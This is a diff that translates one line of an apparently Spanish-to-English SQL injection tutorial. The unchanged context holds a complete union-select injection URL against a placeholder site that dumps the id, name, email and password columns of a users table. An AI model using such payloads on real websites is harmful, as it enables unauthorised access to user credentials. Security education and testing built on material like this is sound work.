@@ -239,7 +239,7 @@ It shows us:
 
 which are generally the ones that can be found.
 
-Now, to display the content of those columns: `id, name, email, passwd` solo tenemos que recordar en que tabla estan para asi poder llamarlas, así;
+Now, to display the content of those columns: `id, name, email, passwd` we just have to remember which table they are in so we can call them, like this;
 
 ```
 http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1' union select 1,2,3,4,group_concat(id,name,email,passwd),6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,23 from usuarios --+
